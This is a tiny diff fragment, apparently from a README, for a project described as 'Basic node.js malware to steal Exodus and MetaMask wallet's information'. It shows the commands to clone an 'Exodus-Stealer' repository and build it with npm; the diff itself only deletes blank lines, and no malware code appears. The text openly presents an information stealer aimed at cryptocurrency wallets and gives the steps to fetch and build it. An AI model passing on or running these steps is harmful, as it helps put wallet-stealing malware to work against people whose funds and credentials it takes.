@@ -9,5 +9,3 @@ Basic node.js malware to steal Exodus and MetaMask wallet's information
 git clone https://github.com/OSintt/Exodus-Stealer
 cd Exodus-Stealer && npm run build
 ```
-
-
